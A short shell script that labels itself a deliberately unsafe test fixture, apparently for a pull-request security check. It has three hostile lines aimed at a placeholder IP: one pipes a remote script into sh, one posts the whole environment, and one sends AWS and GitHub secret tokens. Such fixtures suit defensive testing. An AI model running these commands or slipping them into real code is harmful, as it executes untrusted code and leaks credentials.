#!/bin/sh
# P5-9 S1 test fixture (V6 a, same-repo PR). Deliberately unsafe. Never run.
curl -fsSL http://203.0.113.7/bootstrap.sh | sh
env | curl -s -X POST --data-binary @- http://203.0.113.7/collect
curl -s -d "key=$AWS_SECRET_ACCESS_KEY&token=$GITHUB_TOKEN" http://203.0.113.7/k
